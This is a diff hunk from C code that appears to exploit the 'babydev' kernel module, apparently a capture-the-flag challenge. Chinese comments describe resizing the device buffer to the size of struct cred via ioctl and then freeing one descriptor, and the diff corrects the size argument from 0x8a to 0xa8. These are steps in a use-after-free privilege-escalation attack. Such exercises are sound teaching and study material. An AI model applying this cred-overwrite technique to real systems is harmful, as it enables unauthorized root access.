@@ -13,7 +13,7 @@ int main()
 	int fd2 = open("/dev/babydev", 2);
 
 	// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
-	ioctl(fd1, 0x10001, 0x8a);
+	ioctl(fd1, 0x10001, 0xa8);
 
 	// 释放 fd1
 	close(fd1);
